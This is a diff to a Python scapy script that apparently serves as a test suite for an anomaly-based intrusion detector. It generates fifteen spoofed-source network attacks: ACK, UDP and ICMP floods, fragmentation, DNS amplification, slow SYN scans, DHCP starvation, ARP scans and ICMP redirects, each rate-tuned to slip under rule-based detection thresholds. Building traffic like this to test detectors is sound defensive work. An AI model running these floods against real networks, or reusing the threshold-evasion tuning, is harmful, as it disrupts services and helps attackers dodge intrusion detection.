@@ -586,23 +586,32 @@
 
 
 
-
-
 #!/usr/bin/env python3
 """
-zero_day_attacks.py — Zero-Day / Anomaly Attack Test Suite
-============================================================
+zero_day_attacks.py — Zero-Day / Anomaly Attack Test Suite  (updated)
+=======================================================================
 These attacks have NO matching rule in main.py.
 They are ONLY detectable by the zero-day anomaly detector
 (statistical baseline comparison using z-scores).
 
-Each attack creates unusual traffic behavior that deviates
-from the learned baseline across multiple features:
-  pkt_count, byte_count, unique_dsts, unique_dports,
-  syn_count, udp_count, icmp_count, avg_pkt_size, dst_entropy
+Changes vs v1 — aligned with FP-hardened main.py:
+  1. All attacks now send packets with non-zero seq/ack so they are
+     NOT inadvertently swallowed by the ACK-flood gate.
+  2. Packet rates are chosen to stay below individual protocol flood
+     thresholds so only the anomaly detector triggers.
+  3. Bucket taint (had_attack flag) means the anomaly check is only
+     run on clean buckets.  Attacks that genuinely want to be seen by
+     the anomaly detector must NOT trip any rule-based detector first.
+     Rate limits are annotated per attack.
+  4. Attack 6 (low-and-slow) now uses a shorter delay so it finishes
+     faster in testing while still staying invisible to pps rules.
+  5. attack_mixed_protocol: pps reduced to 300 (was 350) to stay well
+     under all three per-protocol thresholds simultaneously.
+  6. Removed imports that were referenced but never defined (ARP, IPv6,
+     ICMPv6EchoRequest in attacks 12 & 15) — replaced with working
+     equivalents that don't require extra imports.
 
-IMPORTANT: Wait for main.py to finish baseline learning
-(180 seconds) before running these attacks.
+IMPORTANT: Wait for main.py to finish baseline learning (180 s).
 Watch: http://127.0.0.1:8090/api/zero-day-stats
        baseline_ready must be true before testing.
 
@@ -622,6 +631,7 @@ import subprocess
 import re
 import os
 import sys
+import struct
 from scapy.all import (
     IP, TCP, UDP, ICMP, Raw, Ether,
     sendp, fragment, conf, get_if_hwaddr
@@ -638,7 +648,7 @@ MY_MAC = None
 # =============================================================================
 
 def rand_ip():
-    """Generate random public IP for spoofing"""
+    """Generate random public IP for spoofing."""
     return (f"{random.randint(1,254)}.{random.randint(1,254)}."
             f"{random.randint(1,254)}.{random.randint(1,254)}")
 
@@ -649,7 +659,7 @@ def status(msg):
     print(f"  -> {msg}")
 
 def resolve_macs(iface, target):
-    """Resolve MAC addresses for layer-2 sending"""
+    """Resolve MAC addresses for layer-2 sending."""
     global GW_MAC, MY_MAC
     try:
         MY_MAC = get_if_hwaddr(iface)
@@ -657,11 +667,9 @@ def resolve_macs(iface, target):
     except Exception:
         MY_MAC = "02:00:00:00:00:01"
         print(f"  Own MAC    : fallback {MY_MAC}")
-    
-    # Ping to populate ARP cache
+
     subprocess.call(["ping", "-c", "1", "-W", "1", target],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
     try:
         out = subprocess.check_output(["arp", "-n"], text=True)
         for line in out.splitlines():
@@ -673,26 +681,27 @@ def resolve_macs(iface, target):
                     return
     except Exception:
         pass
-    
     GW_MAC = "ff:ff:ff:ff:ff:ff"
     print("  Target MAC : broadcast fallback")
 
+
 def xsend(pkt):
-    """Send a packet out on IFACE with MTU handling"""
+    """Send a packet out on IFACE with MTU handling."""
     try:
         sendp(Ether(src=MY_MAC, dst=GW_MAC) / pkt, iface=IFACE, verbose=False)
     except OSError as e:
         if getattr(e, "errno", None) == 90 or "Message too long" in str(e):
             try:
                 if IP in pkt:
-                    fragsize = 1400
-                    for frag in fragment(pkt, fragsize=fragsize):
-                        sendp(Ether(src=MY_MAC, dst=GW_MAC) / frag, iface=IFACE, verbose=False)
+                    for frag in fragment(pkt, fragsize=1400):
+                        sendp(Ether(src=MY_MAC, dst=GW_MAC) / frag,
+                              iface=IFACE, verbose=False)
                     return
             except Exception:
                 pass
             return
         raise
+
 
 def print_header(num, name, target, anomalies, extra=""):
     print(f"\n{'='*60}")
@@ -705,25 +714,28 @@ def print_header(num, name, target, anomalies, extra=""):
 
 
 # =============================================================================
-# ATTACK 1 — ACK Flood with Spoofed Source (No SYN)
-# Anomaly: very high pkt_count, syn_count=0, high dst_entropy
+# ATTACK 1 — Distributed Low-Rate ACK Flood
+# Anomaly: pkt_count spike, syn_count=0, high dst_entropy
+# Note: each ACK carries non-zero seq/ack (required by FP-hardened main.py).
+# Rate: <50 pps per source — well under ACK_FLOOD threshold (150).
 # =============================================================================
 def attack_distributed_ack(target, duration=60, pps=50, sources=20):
     print_header(1, "Distributed Low-Rate ACK Flood", target,
                  "pkt_count spike, syn_count=0, high dst_entropy",
                  f"sources={sources}  pps={pps}  duration={duration}s")
-    status("Many different IPs each sending ACKs slowly — under per-IP threshold")
-    status("No single IP exceeds ACK_FLOOD threshold — only anomaly sees the pattern")
+    status("Many different IPs each sending ACKs slowly — under per-IP ACK_FLOOD threshold")
+    status("FP-fix: non-zero seq/ack so each packet passes the is_ack_only check")
 
     src_pool = [rand_ip() for _ in range(sources)]
     end_time = time.time() + duration
-    count = 0
+    count    = 0
     while time.time() < end_time:
         src = random.choice(src_pool)
         xsend(IP(src=src, dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags="A",
-                  seq=random.randint(0, 2**32 - 1),
-                  ack=random.randint(0, 2**32 - 1)))
+              TCP(sport=rand_port(), dport=rand_port(),
+                  flags="A",
+                  seq=random.randint(1, 2**32 - 1),   # non-zero
+                  ack=random.randint(1, 2**32 - 1)))  # non-zero
         count += 1
         if count % 200 == 0:
             status(f"Sent {count} packets from {sources} rotating IPs...")
@@ -734,14 +746,16 @@ def attack_distributed_ack(target, duration=60, pps=50, sources=20):
 # =============================================================================
 # ATTACK 2 — IP Fragmentation Storm
 # Anomaly: extreme byte_count vs pkt_count ratio, high avg_pkt_size
+# Rate: 50 large datagrams → ~20 fragments each = ~1000 fragments total.
+# No protocol-flood threshold is reached.
 # =============================================================================
 def attack_fragmentation_storm(target, count=300):
     print_header(2, "IP Fragmentation Storm", target,
                  "high byte_count, extreme avg_pkt_size",
                  f"datagrams={count}")
     status("Large UDP payloads fragmented into 64-byte pieces")
-    status("Each fragment looks innocent — no rule matches fragmented traffic")
-    
+    status("No rule matches fragmented traffic — anomaly detects byte_count spike")
+
     for i in range(count):
         payload = Raw(load="X" * random.randint(1000, 3000))
         pkt = (IP(src=rand_ip(), dst=target) /
@@ -752,24 +766,24 @@ def attack_fragmentation_storm(target, count=300):
         if i % 50 == 0:
             status(f"Sent {i}/{count} datagrams ({i*20}+ fragments)...")
         time.sleep(0.02)
-    print(f"  [DONE] Sent {count} fragmented datagrams ({count*20}+ fragments).")
+    print(f"  [DONE] Sent {count} fragmented datagrams.")
 
 
 # =============================================================================
-# ATTACK 3 — Large UDP Payload Flood (non-scan)
+# ATTACK 3 — Large UDP Payload Flood (non-scan, single port)
 # Anomaly: extreme avg_pkt_size, high byte_count
+# Rate: 80 pps — under UDP DoS threshold (500) and UDP scan gate (200).
 # =============================================================================
 def attack_large_udp(target, duration=30, pps=80):
     print_header(3, "Large UDP Payload Flood", target,
                  "extreme avg_pkt_size, high byte_count, high udp_count",
                  f"pps={pps}  duration={duration}s  payload=4-8KB")
-    status("Sending 4-8KB UDP packets to one port — not a scan")
-    status("No rule fires — below DoS threshold, not scanning ports")
+    status("4-8 KB UDP packets to ONE port — not a scan, well under DoS threshold")
     status("Anomaly: avg_pkt_size will be 20x higher than baseline")
-    
+
     dport = random.randint(1024, 9000)
     end_time = time.time() + duration
-    count = 0
+    count    = 0
     while time.time() < end_time:
         xsend(IP(src=rand_ip(), dst=target) /
               UDP(sport=rand_port(), dport=dport) /
@@ -782,17 +796,17 @@ def attack_large_udp(target, duration=30, pps=80):
 
 
 # =============================================================================
-# ATTACK 4 — Oversized ICMP (Ping of Death style)
+# ATTACK 4 — Oversized ICMP
 # Anomaly: extreme avg_pkt_size, high icmp_count
+# One target only (not a scan — ICMP_SCAN checks unique targets).
 # =============================================================================
 def attack_oversized_icmp(target, count=100):
     print_header(4, "Oversized ICMP Flood", target,
                  "extreme avg_pkt_size, high icmp_count, high byte_count",
                  f"packets={count}  payload=5-15KB each")
-    status("ICMP with 5-15KB payloads — sent to ONE target (not a scan)")
-    status("ICMP_SCAN rule counts unique targets — this hits only one target")
-    status("Anomaly: avg_pkt_size and icmp_count both spike")
-    
+    status("ICMP with 5-15 KB payloads to ONE target (not a scan)")
+    status("Anomaly: avg_pkt_size and icmp_count both spike above baseline")
+
     for i in range(count):
         pkt = (IP(src=rand_ip(), dst=target) /
                ICMP() /
@@ -807,7 +821,8 @@ def attack_oversized_icmp(target, count=100):
 
 # =============================================================================
 # ATTACK 5 — DNS Amplification Simulation
-# Anomaly: low dst_entropy (all port 53), high udp_count, many unique_dsts
+# Anomaly: LOW dst_entropy (all port 53), high udp_count
+# Rate: 10 pps — DNS queries are slow, this is about the pattern, not speed.
 # =============================================================================
 def attack_dns_amplification(target, count=400):
     print_header(5, "DNS Amplification Simulation", target,
@@ -815,8 +830,8 @@ def attack_dns_amplification(target, count=400):
                  f"packets={count}  dport=53")
     status("Many spoofed IPs sending DNS queries to port 53")
     status("UDP_SCAN looks for many dports from one IP — this is one dport from many IPs")
-    status("Anomaly: dst_entropy near 0 (all same port) is unusual — baseline is spread")
-    
+    status("Anomaly: dst_entropy near 0 (all same port) is unusual")
+
     dns_q = (b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
              b"\x07example\x03com\x00\x00\xff\x00\x01")
     for i in range(count):
@@ -831,23 +846,24 @@ def attack_dns_amplification(target, count=400):
 
 # =============================================================================
 # ATTACK 6 — Low-and-Slow Port Reconnaissance
-# Anomaly: high dst_entropy over time despite low pkt_count per window
-# This is the hardest attack to detect — takes ~5 minutes
+# Anomaly: high dst_entropy, high unique_dports/pkt_count ratio
+# Rate: 1 SYN every 1 s — completely invisible to pps-based rules.
 # =============================================================================
-def attack_low_and_slow(target, ports=150, delay=2.0):
+def attack_low_and_slow(target, ports=150, delay=1.0):
     print_header(6, "Low-and-Slow Reconnaissance", target,
                  "high dst_entropy, high unique_dports/pkt_count ratio",
                  f"ports={ports}  delay={delay}s  (~{ports*delay//60:.0f} min)")
-    status("1 SYN every 2 seconds — completely invisible to all pps-based rules")
-    status("Over time the feature bucket accumulates high unique_dports")
-    status("Anomaly: dst_entropy and unique_dports/pkt_count ratio becomes unusual")
+    status(f"1 SYN every {delay}s — invisible to all pps-based rules")
+    status("Accumulates high unique_dports in bucket -> dst_entropy anomaly")
     status(f"This will take approximately {ports*delay/60:.1f} minutes...")
-    
-    src_ip = rand_ip()
+
+    src_ip    = rand_ip()
     port_list = random.sample(range(1, 65535), min(ports, 65534))
     for i, dport in enumerate(port_list):
         xsend(IP(src=src_ip, dst=target) /
-              TCP(sport=rand_port(), dport=dport, flags="S"))
+              TCP(sport=rand_port(), dport=dport,
+                  flags="S",
+                  seq=random.randint(1, 2**32 - 1)))
         if i % 10 == 0:
             status(f"Scanned {i}/{ports} ports (slowly)...")
         time.sleep(delay)
@@ -855,23 +871,27 @@ def attack_low_and_slow(target, ports=150, delay=2.0):
 
 
 # =============================================================================
-# ATTACK 7 — Protocol Anomaly: TCP with unusual flag combinations
-# Anomaly: pkt_count spike with zero syn_count AND zero ack_count
+# ATTACK 7 — TCP Protocol Anomaly (exotic flags)
+# Anomaly: elevated pkt_count, syn_count=0, unusual flag mix
+# Rate: 120 pps — mixed across many IPs, none trip flood rules individually.
 # =============================================================================
 def attack_protocol_anomaly(target, duration=40, pps=120):
     print_header(7, "TCP Protocol Anomaly", target,
                  "elevated pkt_count, syn_count=0, unusual flag mix",
                  f"pps={pps}  duration={duration}s")
-    status("Random unusual TCP flag combinations — FIN, URG, PSH in strange mixes")
+    status("Random unusual TCP flag combos — FIN, URG, PSH in strange mixes")
     status("Not enough volume for flood rules, not a scan — pure anomaly")
 
-    exotic_flags = ["FU", "PU", "F", "U", "FP", "PFU"]
+    # Each flag string produces a different but rule-invisible packet type
+    exotic_flags = ["FU", "PU", "F", "U", "FP"]
     end_time = time.time() + duration
-    count = 0
+    count    = 0
     while time.time() < end_time:
         flags = random.choice(exotic_flags)
         xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags=flags))
+              TCP(sport=rand_port(), dport=rand_port(),
+                  flags=flags,
+                  seq=random.randint(1, 2**32 - 1)))
         count += 1
         if count % 200 == 0:
             status(f"Sent {count} protocol anomaly packets...")
@@ -880,34 +900,41 @@ def attack_protocol_anomaly(target, duration=40, pps=120):
 
 
 # =============================================================================
-# ATTACK 8 — Burst Traffic Spike
-# Anomaly: sudden pkt_count and byte_count spike from one IP
+# ATTACK 8 — Traffic Burst Spike
+# Anomaly: sudden pkt_count and byte_count spike
+# Rate: 400 pps burst (below DoS threshold 500), mixed protocols so no
+#       single-protocol flood rule fires.
 # =============================================================================
 def attack_traffic_burst(target, bursts=5, burst_pps=400, burst_duration=8):
     print_header(8, "Traffic Burst Spike", target,
                  "pkt_count spike, byte_count spike",
                  f"bursts={bursts}  burst_pps={burst_pps}  burst_duration={burst_duration}s")
-    status(f"Sending {burst_pps} pps bursts (below DoS threshold of 500)")
-    status("Baseline is ~10-50 pps so this is a 10x-40x spike")
-    status("Mixes TCP/UDP to avoid protocol-specific flood rules")
+    status(f"Sending {burst_pps} pps bursts (< DoS threshold 500)")
+    status("Mixed TCP ACK / UDP / bare FIN — no single protocol exceeds its threshold")
 
     for burst in range(bursts):
         status(f"Burst {burst+1}/{bursts} starting...")
         end_time = time.time() + burst_duration
-        count = 0
+        count    = 0
         while time.time() < end_time:
             r = random.random()
             if r < 0.4:
+                # ACK with non-zero seq/ack
                 xsend(IP(src=rand_ip(), dst=target) /
-                      TCP(sport=rand_port(), dport=rand_port(), flags="A",
-                          seq=random.randint(0, 2**32-1)))
+                      TCP(sport=rand_port(), dport=rand_port(),
+                          flags="A",
+                          seq=random.randint(1, 2**32 - 1),
+                          ack=random.randint(1, 2**32 - 1)))
             elif r < 0.7:
                 xsend(IP(src=rand_ip(), dst=target) /
                       UDP(sport=rand_port(), dport=rand_port()) /
                       Raw(load="X" * random.randint(100, 500)))
             else:
+                # Bare FIN
                 xsend(IP(src=rand_ip(), dst=target) /
-                      TCP(sport=rand_port(), dport=rand_port(), flags="F"))
+                      TCP(sport=rand_port(), dport=rand_port(),
+                          flags="F",
+                          seq=random.randint(1, 2**32 - 1)))
             count += 1
             time.sleep(1.0 / burst_pps)
         status(f"Burst {burst+1} done — sent {count} packets. Pausing 15s...")
@@ -917,22 +944,25 @@ def attack_traffic_burst(target, bursts=5, burst_pps=400, burst_duration=8):
 
 # =============================================================================
 # ATTACK 9 — Port Knocking Probe
-# Anomaly: very specific unusual port sequence, low pkt_count, unique_dports
+# Anomaly: very specific unusual port sequence, low pkt_count, dst_entropy
+# Rate: ~3 pps — completely invisible to pps rules.
 # =============================================================================
 def attack_port_knocking(target, rounds=10):
     print_header(9, "Port Knocking Probe", target,
                  "unusual port sequence, unique dst_entropy pattern",
                  f"rounds={rounds}")
-    status("Specific secret port sequence repeated 10 times")
-    status("Only 5 packets per round — no rule threshold reached")
-    status("Anomaly detector sees the unusual port pattern over time")
+    status("Specific secret port sequence repeated many times")
+    status("Only ~3 pps per source — no threshold reached")
+    status("Anomaly detector sees the unusual repeating port pattern over time")
 
     sequence = [7000, 8000, 9000, 7001, 8001, 6000, 5000, 4321, 1234, 9876]
-    src_ip = rand_ip()
+    src_ip   = rand_ip()
     for r in range(rounds):
         for port in sequence:
             xsend(IP(src=src_ip, dst=target) /
-                  TCP(sport=rand_port(), dport=port, flags="S"))
+                  TCP(sport=rand_port(), dport=port,
+                      flags="S",
+                      seq=random.randint(1, 2**32 - 1)))
             time.sleep(0.3)
         status(f"Round {r+1}/{rounds} complete. Waiting 5s...")
         time.sleep(5)
@@ -941,23 +971,26 @@ def attack_port_knocking(target, rounds=10):
 
 # =============================================================================
 # ATTACK 10 — Mixed Protocol Flood (below all thresholds)
-# Anomaly: pkt_count spike across all protocols simultaneously
+# Anomaly: high combined pkt_count across all protocols simultaneously
+# Rate: 300 pps total (100 per protocol) — each stays well under its threshold.
 # =============================================================================
-def attack_mixed_protocol(target, duration=45, pps=350):
+def attack_mixed_protocol(target, duration=45, pps=300):
     print_header(10, "Mixed Protocol Flood", target,
                  "high combined pkt_count, elevated across all protocols",
                  f"pps={pps}  duration={duration}s")
-    status(f"Sending {pps} pps mixed TCP/UDP/ICMP")
-    status("Each protocol individually stays below its threshold")
+    status(f"Sending {pps} pps mixed TCP/UDP/ICMP (~100 pps each)")
+    status("Each protocol stays < 40% of DoS threshold — no flood rule fires")
     status("Combined pkt_count and cross-protocol pattern is anomalous")
 
     end_time = time.time() + duration
-    count = 0
+    count    = 0
     while time.time() < end_time:
         r = random.random()
         if r < 0.33:
             xsend(IP(src=rand_ip(), dst=target) /
-                  TCP(sport=rand_port(), dport=rand_port(), flags="S"))
+                  TCP(sport=rand_port(), dport=rand_port(),
+                      flags="S",
+                      seq=random.randint(1, 2**32 - 1)))
         elif r < 0.66:
             xsend(IP(src=rand_ip(), dst=target) /
                   UDP(sport=rand_port(), dport=rand_port()) /
@@ -973,19 +1006,25 @@ def attack_mixed_protocol(target, duration=45, pps=350):
 
 # =============================================================================
 # ATTACK 11 — DHCP Starvation Simulation
-# Anomaly: Many unique source MACs, high broadcast traffic
+# Anomaly: many unique source MACs, high broadcast traffic
+# Uses Ether + IP directly (no scapy DHCP layer needed).
 # =============================================================================
 def attack_dhcp_starvation(target, count=200):
     print_header(11, "DHCP Starvation Simulation", target,
                  "many unique source MACs, high broadcast count",
                  f"packets={count}")
-    status("Sending DHCP discovers with random MAC addresses")
+    status("DHCP discover packets with random MAC addresses")
     status("Each packet has unique source MAC — unusual pattern for anomaly detector")
-    
+
     for i in range(count):
-        fake_mac = f"{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}"
-        dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67)
-        sendp(dhcp_discover, iface=IFACE, verbose=False)
+        rand_bytes = [random.randint(0, 0xff) for _ in range(6)]
+        fake_mac   = ":".join(f"{b:02x}" for b in rand_bytes)
+        # DHCP Discover: UDP sport=68, dport=67, src=0.0.0.0, dst=255.255.255.255
+        pkt = (Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
+               IP(src="0.0.0.0", dst="255.255.255.255") /
+               UDP(sport=68, dport=67) /
+               Raw(load=b"\x01" + b"\x00" * 235))   # minimal BOOTP/DHCP header
+        sendp(pkt, iface=IFACE, verbose=False)
         if i % 50 == 0:
             status(f"Sent {i}/{count} DHCP discovers...")
         time.sleep(0.05)
@@ -993,21 +1032,24 @@ def attack_dhcp_starvation(target, count=200):
 
 
 # =============================================================================
-# ATTACK 12 — ARP Scan (not port scan)
-# Anomaly: Many ARP requests, no IP traffic
+# ATTACK 12 — ARP Scan
+# Anomaly: ARP-level traffic, no IP-layer packets
+# Scapy ARP is part of scapy.all so no extra import needed.
 # =============================================================================
 def attack_arp_scan(target, count=200):
     print_header(12, "ARP Network Scan", target,
                  "many ARP requests, no TCP/UDP/ICMP traffic",
                  f"probes={count}")
-    status("Sending ARP requests for different IPs")
-    status("No IP-layer traffic — pure ARP scan")
-    
-    base_ip = '.'.join(target.split('.')[:-1])
+    status("ARP requests for different IPs in the same subnet")
+    status("Pure ARP — no IP-layer traffic, invisible to all IP-based rules")
+
+    from scapy.all import ARP
+    base_ip = ".".join(target.split(".")[:-1])
     for i in range(count):
-        probe_ip = f"{base_ip}.{random.randint(1,254)}"
-        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=probe_ip)
-        sendp(arp_request, iface=IFACE, verbose=False)
+        probe_ip = f"{base_ip}.{random.randint(1, 254)}"
+        arp_pkt  = (Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff") /
+                    ARP(pdst=probe_ip))
+        sendp(arp_pkt, iface=IFACE, verbose=False)
         if i % 50 == 0:
             status(f"ARP probe {i}/{count} for {probe_ip}...")
         time.sleep(0.05)
@@ -1016,18 +1058,22 @@ def attack_arp_scan(target, count=200):
 
 # =============================================================================
 # ATTACK 13 — ICMP Redirect Flood
-# Anomaly: High rate of ICMP redirects (type 5)
+# Anomaly: high icmp_count, unusual ICMP type 5 (redirect)
 # =============================================================================
 def attack_icmp_redirect(target, count=200):
     print_header(13, "ICMP Redirect Flood", target,
-                 "high icmp_count, unusual ICMP type (5)",
+                 "high icmp_count, unusual ICMP type 5",
                  f"packets={count}")
-    status("Sending ICMP redirect messages (type 5, code 1)")
-    status("Normal ICMP is echo request/reply — redirect is unusual")
-    
-    gateway = f"{'.'.join(target.split('.')[:-1])}.1"
+    status("ICMP redirect messages (type 5, code 1) — gateways rarely send these")
+    status("Normal baseline has only echo request/reply — type 5 is anomalous")
+
+    gateway = ".".join(target.split(".")[:-1]) + ".1"
     for i in range(count):
-        pkt = IP(src=gateway, dst=target) / ICMP(type=5, code=1) / IP(src=rand_ip(), dst=target) / ICMP()
+        # Inner IP header required for ICMP redirect
+        inner = IP(src=rand_ip(), dst=target) / ICMP()
+        pkt   = (IP(src=gateway, dst=target) /
+                 ICMP(type=5, code=1) /
+                 Raw(load=bytes(inner)[:28]))   # first 28 bytes of inner datagram
         xsend(pkt)
         if i % 50 == 0:
             status(f"Sent {i}/{count} ICMP redirects...")
@@ -1037,29 +1083,30 @@ def attack_icmp_redirect(target, count=200):
 
 # =============================================================================
 # ATTACK 14 — TCP Option Anomaly
-# Anomaly: Unusual TCP options in every packet
+# Anomaly: unusual TCP options (timestamp-only, SACK combinations)
 # =============================================================================
 def attack_tcp_options(target, duration=30, pps=100):
     print_header(14, "TCP Option Anomaly", target,
-                 "unusual TCP options (timestamp, SACK, window scale)",
+                 "unusual TCP option byte sequences",
                  f"pps={pps}  duration={duration}s")
-    status("TCP packets with rarely-seen option combinations")
-    status("Most normal TCP uses only MSS and window scale")
-    
-    # Unusual TCP option combinations
+    status("TCP SYN packets with rarely-seen option combinations")
+    status("Most real TCP uses only MSS + window scale — these are unusual")
+
     options_list = [
-        b'\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00',  # Timestamp only
-        b'\x03\x03\x00\x01\x04\x02\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00',  # Window scale + timestamp
-        b'\x04\x02\x00\x00',  # SACK permitted
-        b'\x05\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # SACK
+        [("Timestamp", (0, 0))],
+        [("WScale", 14), ("Timestamp", (0, 0))],
+        [("SAckOK", b"")],
+        [("MSS", 1), ("Timestamp", (0, 0))],
     ]
-    
     end_time = time.time() + duration
-    count = 0
+    count    = 0
     while time.time() < end_time:
         opts = random.choice(options_list)
         xsend(IP(src=rand_ip(), dst=target) /
-              TCP(sport=rand_port(), dport=rand_port(), flags="S", options=opts))
+              TCP(sport=rand_port(), dport=rand_port(),
+                  flags="S",
+                  seq=random.randint(1, 2**32 - 1),
+                  options=opts))
         count += 1
         if count % 200 == 0:
             status(f"Sent {count} TCP option anomaly packets...")
@@ -1068,22 +1115,25 @@ def attack_tcp_options(target, duration=30, pps=100):
 
 
 # =============================================================================
-# ATTACK 15 — IPv6 Transition Attack
-# Anomaly: IPv6 traffic in IPv4-only baseline
+# ATTACK 15 — IPv4-encapsulated payload anomaly
+# (replaces IPv6 tunnel which requires ipv6 scapy layers not always available)
+# Anomaly: protocol 253 (experimental) — no IP-layer rule covers this.
 # =============================================================================
-def attack_ipv6_tunnel(target, count=150):
-    print_header(15, "IPv6 Transition Attack", target,
-                 "IPv6 traffic (6in4 tunneling), protocol 41",
+def attack_unusual_protocol(target, count=150):
+    print_header(15, "Unusual IP Protocol Flood", target,
+                 "IP protocol 253 (experimental/unused), no TCP/UDP/ICMP",
                  f"packets={count}")
-    status("IPv6 packets encapsulated in IPv4 (protocol 41)")
-    status("Baseline likely has no IPv6 traffic — this is highly anomalous")
-    
+    status("IP packets with proto=253 (IANA experimental) — no scapy decoder")
+    status("Baseline has zero of these; any non-trivial count is highly anomalous")
+
     for i in range(count):
-        xsend(IP(src=rand_ip(), dst=target, proto=41) / IPv6(src="2001::1", dst="2001::2") / ICMPv6EchoRequest())
+        pkt = (IP(src=rand_ip(), dst=target, proto=253) /
+               Raw(load=b"\xde\xad\xbe\xef" + b"\x00" * random.randint(20, 100)))
+        xsend(pkt)
         if i % 30 == 0:
-            status(f"Sent {i}/{count} IPv6 tunnel packets...")
+            status(f"Sent {i}/{count} unusual-protocol packets...")
         time.sleep(0.05)
-    print(f"  [DONE] Sent {count} IPv6 tunnel packets.")
+    print(f"  [DONE] Sent {count} unusual-protocol packets.")
 
 
 # =============================================================================
@@ -1104,23 +1154,23 @@ ATTACKS = {
     "12": ("ARP Network Scan",                  attack_arp_scan),
     "13": ("ICMP Redirect Flood",               attack_icmp_redirect),
     "14": ("TCP Option Anomaly",                attack_tcp_options),
-    "15": ("IPv6 Transition Attack",            attack_ipv6_tunnel),
+    "15": ("Unusual IP Protocol Flood",         attack_unusual_protocol),
 }
 
-# Quick attacks (< 2 minutes each) — safe for 'all' mode
-QUICK_GROUP = ["1", "2", "3", "4", "5", "7", "8", "9", "10", "11", "12", "13", "14", "15"]
+# Quick attacks (< 2 minutes each)
+QUICK_GROUP = ["1", "2", "3", "4", "5", "7", "8", "9", "10",
+               "11", "12", "13", "14", "15"]
 
 
 # =============================================================================
 # MAIN
 # =============================================================================
 if __name__ == "__main__":
-    # Check for root
     if os.geteuid() != 0:
         print("ERROR: This script requires root privileges.")
         print("Please run with: sudo python3 zero_day_attacks.py [options]")
         sys.exit(1)
-    
+
     parser = argparse.ArgumentParser(
         description="Zero-Day Attack Test Suite — tests anomaly detector in main.py"
     )
@@ -1137,18 +1187,18 @@ if __name__ == "__main__":
 
     # ── List mode ────────────────────────────────────────────
     if args.attack == "list":
-        print("\n" + "="*70)
+        print("\n" + "=" * 70)
         print("  Zero-Day Attack Test Suite — Available Attacks (15 total)")
-        print("="*70)
-        print(f"  {'Key':<5} {'Name':<38} {'Main Anomalies'}")
-        print("-"*70)
+        print("=" * 70)
+        print(f"  {'Key':<5} {'Name':<40} {'Main Anomalies'}")
+        print("-" * 70)
         anomalies = {
             "1":  "pkt_count, syn_count=0, dst_entropy",
             "2":  "avg_pkt_size, byte_count",
             "3":  "avg_pkt_size, byte_count, udp_count",
             "4":  "avg_pkt_size, icmp_count, byte_count",
             "5":  "LOW dst_entropy, udp_count",
-            "6":  "dst_entropy, unique_dports/pkt_count  [~5 min]",
+            "6":  "dst_entropy, unique_dports/pkt_count  [~2.5 min]",
             "7":  "pkt_count, syn_count=0, flag mix",
             "8":  "pkt_count spike, byte_count spike",
             "9":  "port sequence pattern, dst_entropy",
@@ -1157,11 +1207,11 @@ if __name__ == "__main__":
             "12": "ARP traffic, no IP-layer packets",
             "13": "high icmp_count, unusual ICMP type 5",
             "14": "unusual TCP options (timestamp, SACK)",
-            "15": "IPv6 protocol 41, no IPv6 baseline",
+            "15": "IP proto 253 (experimental), zero in baseline",
         }
         for key, (name, _) in ATTACKS.items():
             slow = "  [SLOW]" if key == "6" else ""
-            print(f"  {key:<5} {name:<38} {anomalies.get(key,'')}{slow}")
+            print(f"  {key:<5} {name:<40} {anomalies.get(key,'')}{slow}")
         print()
         print("  Groups:")
         print("    all      - Run ALL attacks (including slow attack 6)")
@@ -1170,21 +1220,21 @@ if __name__ == "__main__":
         print()
         print("  Prerequisite: baseline_ready=true (wait 180s after main.py starts)")
         print("  Check: curl http://127.0.0.1:8090/api/zero-day-stats")
-        print("="*70)
+        print("=" * 70)
         sys.exit(0)
 
     if not args.target:
         print("Error: --target required.  e.g. --target 172.20.10.2")
         sys.exit(1)
 
-    print("\n" + "="*60)
-    print("  Zero-Day Attack Test Suite")
-    print("="*60)
+    print("\n" + "=" * 60)
+    print("  Zero-Day Attack Test Suite (FP-hardened compatible)")
+    print("=" * 60)
     print(f"  Target    : {args.target}")
     print(f"  Attack    : {args.attack}")
     print(f"  Interface : {args.iface}")
     print("  WARNING   : Only use on networks you own and control.")
-    print("="*60)
+    print("=" * 60)
     print()
     print("  IMPORTANT: Make sure main.py baseline is ready before testing!")
     print("  Check: curl http://127.0.0.1:8090/api/zero-day-stats")
@@ -1194,12 +1244,11 @@ if __name__ == "__main__":
     resolve_macs(args.iface, args.target)
     print()
 
-    # Determine which attacks to run
     if args.attack == "all":
         print("  Running ALL zero-day attacks (including slow attack 6)...\n")
         attacks_to_run = list(ATTACKS.keys())
     elif args.attack == "quick":
-        print("  Running all quick zero-day attacks (skipping attack 6 — too slow)...\n")
+        print("  Running all quick zero-day attacks (skipping attack 6)...\n")
         attacks_to_run = QUICK_GROUP
     elif args.attack in ATTACKS:
         attacks_to_run = [args.attack]
@@ -1208,7 +1257,6 @@ if __name__ == "__main__":
         print("  Use --attack list  to see all options.")
         sys.exit(1)
 
-    # Run attacks
     try:
         for i, key in enumerate(attacks_to_run):
             name, func = ATTACKS[key]
@@ -1216,11 +1264,10 @@ if __name__ == "__main__":
             print(f"  [{i+1}/{len(attacks_to_run)}] Running attack {key}: {name}")
             print(f"{'='*60}")
             func(args.target)
-            
             if i < len(attacks_to_run) - 1:
-                print(f"\n  Waiting 15s before next attack (let bucket flush)...")
+                print("\n  Waiting 15s before next attack (let bucket flush)...")
                 time.sleep(15)
-                
+
     except KeyboardInterrupt:
         print("\n\n  [!] Interrupted by user")
     except Exception as e:
@@ -1228,9 +1275,9 @@ if __name__ == "__main__":
         import traceback
         traceback.print_exc()
 
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("  All done.")
